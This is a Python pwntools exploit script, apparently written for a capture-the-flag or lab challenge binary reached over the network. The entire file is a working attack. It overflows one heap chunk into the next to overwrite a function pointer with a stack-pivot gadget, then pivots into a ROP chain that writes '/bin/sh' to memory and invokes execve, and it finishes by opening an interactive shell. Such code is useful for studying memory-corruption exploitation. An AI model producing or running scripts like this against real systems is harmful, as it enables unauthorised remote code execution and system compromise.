from pwn import *
import sys


def build_heap_rop_chain(main_gadgets):
    heap_rop_chain = b''
    for gadget in main_gadgets:
        heap_rop_chain += gadget
    return heap_rop_chain

def allocate_chunk(payload, len):
    io.recvuntil(b'Choice: ')
    io.sendline(b'1')
    io.recvuntil(b'length: ')
    io.sendline(str(len).encode()) 
    io.recvuntil(b'encrypt: ')
    io.sendline(payload) 

def print_chunk(idx, strtoul_pad = None):
    io.recvuntil(b'Choice: ')
    io.sendline(b'4')
    io.recvuntil(b'print: ')
    if strtoul_pad is None:
        io.sendline(str(idx).encode())
    else:
        io.sendline(str(idx).encode() + strtoul_pad)

def edit_chunk(new_msg, idx):
    io.recvuntil(b'Choice: ')
    io.sendline(b'2')
    io.recvuntil(b'edit: ')
    io.sendline(str(idx).encode())
    io.recvuntil(b'encrypt: ')
    io.sendline(new_msg)

if __name__ == "__main__":
    global io
    if (len(sys.argv) != 3):
        print("Usage : python {} <ip address> <port>".format(sys.argv[0]))
        sys.exit(1)
    # I use port forwaring between the host and guest due to NAT networking, the challenge is on 7741 port in VM
    # Alter the below line of code according to your host-guest network settings
    io = remote(sys.argv[1], int(sys.argv[2]))
    #gdb.attach(io, '''
    #b *print_index + 158
    #c
    #''')

    ptr_size = 4
    msg_len = 128
    offset_to_func_ptr = 140
    offset_to_main_rop_chain = 32
    numbuf_padding = 7
    corrupted_chunk_idx = 1
    first_chunk_len = 130
    bin_sh_str_address = p32(0x80ec704)
    garbage_byte = b'\x41'

    main_gadgets = [
        # sets ecx to 0xffffffff 
        p32(0x0805ce0c), 
        # inc ecx, thus nullifying ecx register
        p32(0x080dcbc0), 
        # pop eax ; ret
        p32(0x080bd226), 
        # /bin
        p32(0x6e69622f), 
        # pop edx ; ret
        p32(0x08082cc6),  
        bin_sh_str_address, 
        # write-what-where gadget -> mov dword ptr [edx], eax ; ret
        p32(0x080a3a1d), 
        # pop eax ; ret
        p32(0x080bd226), 
        # /sh\0
        p32(0x0068732f), 
        # pop edx ; ret
        p32(0x08082cc6), 
        # /bin/sh address + 4
        p32(u32(bin_sh_str_address) + 4), 
        # WWW gadget
        p32(0x080a3a1d), 
        # pop eax ; ret
        p32(0x080bd226), 
        # execve syscall number according to x86 ABI
        p32(0xb), 
        # pop edx ; ret
        p32(0x08082cc6), 
        # edx has to be NULL
        p32(0x0), 
        # software interrupt invocation gadget
        p32(0x08048ef6), 
    ]

    main_rop_chain = build_heap_rop_chain(main_gadgets)
    # misc gadgets
    stack_pivoting_gadget = p32(0x0807e372)
    mov_eax_edx_gadget = p32(0x080671c4)
    pivot_to_heap_gadget = p32(0x0804bb6c)

    # first chunk allocation that will overflow the second
    first_chunk_payload = garbage_byte * msg_len + p32(offset_to_func_ptr + 
                                                       ptr_size + 
                                                       offset_to_main_rop_chain +
                                                       2 * ptr_size + 
                                                       ptr_size * len(main_rop_chain)) 
    allocate_chunk(first_chunk_payload, first_chunk_len)
    
    # the second chunk will carry the main ROP chain, so there is no reason to malform it like the first one
    second_chunk_len = 1
    second_chunk_payload = garbage_byte
    allocate_chunk(second_chunk_payload, second_chunk_len)
    # edit the first chunk to overflow the second in order to write a main payload into it PRIOR to execution flow hijacking
    first_chunk_edited_payload = garbage_byte * offset_to_func_ptr + stack_pivoting_gadget + garbage_byte * offset_to_main_rop_chain + bin_sh_str_address + garbage_byte * ptr_size + main_rop_chain
    edit_chunk(first_chunk_edited_payload, 0)
    # the short ROP chain in numbuf stack buffer that allows to pivot into the heap
    stack_rop_chain = garbage_byte * numbuf_padding + mov_eax_edx_gadget + pivot_to_heap_gadget;
    # trigger the arbitrary code execution via printing the second chunk which function pointer was overwritten with stack pivoting gadget address
    print_chunk(corrupted_chunk_idx, stack_rop_chain) 
    # enjoy the shell :)
    io.interactive()
